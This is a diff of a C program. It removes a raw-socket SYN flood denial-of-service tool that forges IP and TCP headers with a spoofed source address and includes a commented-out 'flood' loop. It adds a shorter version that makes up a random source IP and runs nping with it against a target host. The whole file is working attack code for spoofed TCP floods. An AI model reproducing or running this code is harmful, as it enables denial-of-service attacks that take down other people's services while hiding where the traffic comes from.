@@ -1,162 +1,31 @@
-/*
-	Syn Flood DOS with LINUX sockets
-*/
-#include<stdio.h>
-#include<stdlib.h> //for exit(0);
-#include<string.h> //memset
-#include<sys/socket.h>
-#include<errno.h> //For errno - the error number
-#include<netinet/tcp.h>	//Provides declarations for tcp header
-#include<netinet/ip.h>	//Provides declarations for ip header
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <string.h>
+#include "stdio.h"
+#include "errno.h"
+#include "stdlib.h"
+#include "unistd.h"
+#include <time.h>
 
-struct ip {
-#if BYTE_ORDER == LITTLE_ENDIAN 
-    uint8_t  ip_hl:4,        /* header length */
-        ip_v:4;         /* version */
-#endif
-#if BYTE_ORDER == BIG_ENDIAN 
-    uint8_t  ip_v:4,         /* version */
-        ip_hl:4;        /* header length */
-#endif
-    uint8_t  ip_tos;         /* type of service */
-    uint16_t    ip_len;         /* total length */
-    uint16_t ip_id;          /* identification */
-    uint16_t   ip_off;         /* fragment offset field */
-#define IP_DF 0x4000            /* dont fragment flag */
-#define IP_MF 0x2000            /* more fragments flag */
-    uint8_t  ip_ttl;         /* time to live */
-    uint8_t  ip_p;           /* protocol */
-    uint16_t ip_sum;         /* checksum */
-    struct  in_addr ip_src,ip_dst;  /* source and dest address */
-};
-
-struct pseudo_header    //needed for checksum calculation
+char *generate_ip_address()
 {
-	unsigned int source_address;
-	unsigned int dest_address;
-	unsigned char placeholder;
-	unsigned char protocol;
-	unsigned short tcp_length;
-	
-	struct tcphdr tcp;
-};
-
-unsigned short csum(unsigned short *ptr,int nbytes) {
-	register long sum;
-	unsigned short oddbyte;
-	register short answer;
-
-	sum=0;
-	while(nbytes>1) {
-		sum+=*ptr++;
-		nbytes-=2;
-	}
-	if(nbytes==1) {
-		oddbyte=0;
-		*((uint8_t*)&oddbyte)=*(uint8_t*)ptr;
-		sum+=oddbyte;
-	}
-
-	sum = (sum>>16)+(sum & 0xffff);
-	sum = sum + (sum>>16);
-	answer=(short)~sum;
-	
-	return(answer);
+    char *ip_address = malloc(16 * sizeof(char));
+    srand(time(NULL));
+    sprintf(ip_address, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);
+    return ip_address;
 }
 
-int main (void)
+int main()
 {
-	//Create a raw socket
-	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
-	//Datagram to represent the packet
-	char datagram[4096] , source_ip[32];
-	//IP header
-	struct iphdr *iph = (struct iphdr *) datagram;
-	//TCP header
-	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
-	struct sockaddr_in sin;
-	struct pseudo_header psh;
-	
-	strcpy(source_ip , "192.168.1.2");
-  
-	sin.sin_family = AF_INET;
-	sin.sin_port = htons(80);
-	sin.sin_addr.s_addr = inet_addr ("1.2.3.4");
-	
-	memset (datagram, 0, 4096);	/* zero out the buffer */
-	
-	//Fill in the IP Header
-	iph->ihl = 5;
-	iph->version = 4;
-	iph->tos = 0;
-	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
-	iph->id = htons(54321);	//Id of this packet
-	iph->frag_off = 0;
-	iph->ttl = 255;
-	iph->protocol = IPPROTO_TCP;
-	iph->check = 0;		//Set to 0 before calculating checksum
-	iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
-	iph->daddr = sin.sin_addr.s_addr;
-	
-	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
-	
-	//TCP Header
-	tcph->source = htons (1234);
-	tcph->dest = htons (80);
-	tcph->seq = 0;
-	tcph->ack_seq = 0;
-	tcph->doff = 5;		/* first and only tcp segment */
-	tcph->fin=0;
-	tcph->syn=1;
-	tcph->rst=0;
-	tcph->psh=0;
-	tcph->ack=0;
-	tcph->urg=0;
-	tcph->window = htons (5840);	/* maximum allowed window size */
-	tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
-				should fill in the correct checksum during transmission */
-	tcph->urg_ptr = 0;
-	//Now the IP checksum
-	
-	psh.source_address = inet_addr( source_ip );
-	psh.dest_address = sin.sin_addr.s_addr;
-	psh.placeholder = 0;
-	psh.protocol = IPPROTO_TCP;
-	psh.tcp_length = htons(20);
-	
-	memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
-	
-	tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
-	
-	//IP_HDRINCL to tell the kernel that headers are included in the packet
-	int one = 1;
-	const int *val = &one;
-	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
-	{
-		// printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
-		printf ("Error setting IP_HDRINCL.");
-		exit(0);
-	}
-	
-	//Uncommend the loop if you want to flood :)
-	//while (1)
-	//{
-		//Send the packet
-		if (sendto (s,		/* our socket */
-					datagram,	/* the buffer containing headers and data */
-					iph->tot_len,	/* total length of our datagram */
-					0,		/* routing flags, normally always 0 */
-					(struct sockaddr *) &sin,	/* socket addr, just like in */
-					sizeof (sin)) < 0)		/* a normal send() */
-		{
-			printf ("error\n");
-		}
-		//Data send successfully
-		else
-		{
-			printf ("Packet Send \n");
-		}
-	//}
-	
-	return 0;
+    char *ip_address = generate_ip_address();
+    char npingCommand[100];
+    sprintf(npingCommand, "nping --tcp --source-ip %s 10.0.0.8", ip_address);
+    printf("%s\n", npingCommand);
+
+    system(npingCommand);
+
+    free(ip_address);
+    return 0;
 }
